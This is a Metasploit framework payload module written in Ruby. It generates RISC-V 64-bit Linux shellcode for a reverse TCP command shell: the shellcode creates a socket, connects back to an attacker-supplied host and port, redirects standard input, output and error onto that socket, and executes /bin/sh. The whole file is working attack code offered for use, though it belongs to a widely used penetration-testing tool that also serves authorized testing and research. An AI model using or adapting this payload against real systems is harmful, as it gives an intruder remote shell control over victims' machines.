##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 160

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Command Shell, Reverse TCP Inline',
        'Description' => 'Connect back to attacker and spawn a command shell.',
        'Author' => [
          'modexp', # connect.s RISC-V 64-bit shellcode
          'bcoles', # metasploit
        ],
        'License' => BSD_LICENSE,
        'Platform' => 'linux',
        'Arch' => [ ARCH_RISCV64LE ],
        'References' => [
          ['URL', 'https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/'],
          ['URL', 'https://web.archive.org/web/20230326161514/https://github.com/odzhan/shellcode/commit/d3ee25a6ebcdd21a21d0e6eccc979e45c24a9a1d'],
        ],
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShellUnix
      )
    )
  end

  # Encode a RISC-V ADDI (Add Immediate) instruction
  def encode_addi(rd, rs1, imm12)
    opcode = 0b0010011
    funct3 = 0b000
    imm = imm12 & 0xfff
    (imm << 20) | (rs1 << 15) | (funct3 << 12) | (rd << 7) | opcode
  end

  # Encode a RISC-V SLLI (Shift Left Logical Immediate) instruction
  def encode_slli(rd, rs1, shamt)
    opcode = 0b0010011
    funct3 = 0b001
    funct6 = 0b000000
    ((funct6 & 0x3f) << 26) | ((shamt & 0x3f) << 20) |
      (rs1 << 15) | (funct3 << 12) | (rd << 7) | opcode
  end

  # Emit RISC-V instruction words that build an arbitrary 64-bit constant in a chosen register
  def load_const_into_reg(const, register)
    raise ArgumentError, "Constant '#{const}' is #{const.class}; not Integer" unless const.is_a?(Integer)

    max_const = (1 << 64) - 1

    raise ArgumentError, "Constant #{const} is outside range 0..#{max_const}" unless const.between?(0, max_const)

    digits = []
    tmp = const

    while tmp > 0
      d = tmp & 0xfff
      tmp >>= 12
      if d > 2047
        d -= 4096
        tmp += 1
      end
      digits << d
    end

    digits = [0] if digits.empty?

    words = [encode_addi(register, 0, digits.pop & 0xfff)]
    digits.reverse_each do |digit|
      words << encode_slli(register, register, 12)
      words << encode_addi(register, register, digit & 0xfff)
    end

    words
  end

  def generate(_opts = {})
    lhost = datastore['LHOST'] || '127.127.127.127'
    lport = datastore['LPORT'].to_i

    raise ArgumentError, 'LHOST must be in IPv4 format.' unless Rex::Socket.is_ipv4?(lhost)

    encoded_host = Rex::Socket.addr_aton(lhost).unpack1('V')
    encoded_port = [lport].pack('n').unpack1('v')
    encoded_sockaddr = (encoded_host << 32) | (encoded_port << 16) | 2

    a1 = 11
    shellcode = [
      0xff010113, # addi sp,sp,-16

      # s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      0x0c600893, # li a7,198  # SYS_socket
      0x00000613, # li a2,0    # IPPROTO_IP
      0x00100593, # li a1,1    # SOCK_STREAM
      0x00200513, # li a0,2    # AF_INET
      0x00000073, # ecall

      # connect(s, &sa, sizeof(sa));
      0x00050693, # mv a3,a0         # a3 = s
      0x0cb00893, # li a7,203        # SYS_connect
      0x01000613, # li a2,16
      *load_const_into_reg(encoded_sockaddr, a1),
      0x00b13023, # sd a1,0(sp)
      0x00010593, # mv a1,sp         # a1 = &sa
      0x00000073, # ecall

      0x01800893, # li a7,24         # SYS_dup3
      0x00300593, # li a1,3          # STDERR_FILENO + 1

      # c_dup:
      0x00000613, # li a2,0
      0x00068513, # mv a0,a3
      0xfff58593, # addi a1,a1,-1
      0x00000073, # ecall
      0xfe0598e3, # bnez	a1,100c8 <c_dup>

      # execve("/bin/sh", NULL, NULL);
      0x0dd00893, # li a7,221
      0x34399537, # lui a0,0x34399
      0x7b75051b, # addiw a0,a0,1975
      0x00c51513, # slli a0,a0,0xc
      0x34b50513, # addi a0,a0,843 # 3439934b <__global_pointer$+0x34387a47>
      0x00d51513, # slli a0,a0,0xd
      0x22f50513, # addi a0,a0,559
      0x00a13023, # sd a0,0(sp)
      0x00010513, # mv a0,sp
      0x00000073  # ecall
    ].pack('V*')

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
